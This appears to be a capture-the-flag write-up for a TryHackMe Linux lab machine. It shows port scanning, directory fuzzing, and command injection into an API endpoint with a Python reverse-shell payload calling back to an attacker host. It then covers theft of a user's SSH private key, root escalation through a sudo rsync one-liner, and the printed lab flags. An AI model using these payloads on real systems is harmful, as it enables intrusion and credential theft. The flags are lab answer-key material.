# Linux Machine

## Machine Info



## Ports Scan

```bash
nmap -T4 -sV -p- --min-rate 1000 --open -oN port_scan.txt 10.200.150.152

Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 20:09 CEST
Nmap scan report for 10.200.150.152
Host is up (0.058s latency).
Not shown: 65511 closed tcp ports (reset), 22 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
Service Info: Host: ip-10-200-150-152.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Breach

The default page give this page

<figure><img src="../../../.gitbook/assets/image (388).png" alt=""><figcaption></figcaption></figure>

An attacker could enumerate the paths with a fuzzing tool like Gobuster

{% code overflow="wrap" %}
```
gobuster dir -u http://10.200.150.152/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -b 503,404
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (389).png" alt=""><figcaption></figcaption></figure>

In this way an attacker has these 3 new paths

```
/docs                 (Status: 200) [Size: 931]
/api                  (Status: 200) [Size: 59]
/redoc                (Status: 200) [Size: 891]
```

This is a API service.

The `/api` page shows a version for the service.

<figure><img src="../../../.gitbook/assets/image (390).png" alt=""><figcaption></figcaption></figure>

The /redoc page shows the service which running in the server.

<figure><img src="../../../.gitbook/assets/image (391).png" alt=""><figcaption></figcaption></figure>



### Service version Outdated

This version is vulnerable to RCE, inject command to establish a Reverse Shell.

{% embed url="https://huntr.com/bounties/32c2c9b1-54cc-46fc-9261-b01fe3b5ede4" %}

{% code overflow="wrap" %}
```bash
curl -v http://10.200.150.152/api/tools -H 'Content-Type: application/json' -d '{"filename":"CommandInjection","dependencies":[],"content":"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.250.1.6\",8899));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"}'
```
{% endcode %}

```
nc -lnvp 8899
```

<figure><img src="../../../.gitbook/assets/image (392).png" alt=""><figcaption></figcaption></figure>



### Lateral Movement

An attacker which made access to the system can steal the `id_rsa` file in the scott's directory.

<figure><img src="../../../.gitbook/assets/image (393).png" alt=""><figcaption></figcaption></figure>

Copying this key an attack can access via SSH using this Private Key

```bash
chmod 600 id_rsa
ssh -i id_rsa scott@10.200.150.152
```



### Machine Flag

As user machine an attacker can steal the machine flag

```bash
cat /user.txt

THM{02e4b6e8-1c95-4bb3-b055-871dca86fe46}
```



## Privilege Escalation

### Insecure Sudo configuration

An attacker after enumerated the Scott permission can exploit this misfoncifguration to obtain root access to the machine.

```bash
sudo -l

Matching Defaults entries for scott on lin3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User scott may run the following commands on lin3:
    (ALL) NOPASSWD: /usr/bin/rsync
```

An attacker could use this rsync insecure configuration to obtain root access.

```bash
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

<figure><img src="../../../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>



### Machine flag

An attacker with root access could steal the root machine flag

```bash
cat /root/root.txt

THM{04bf30f1-9745-4459-b19c-e9159e6d3746}
```
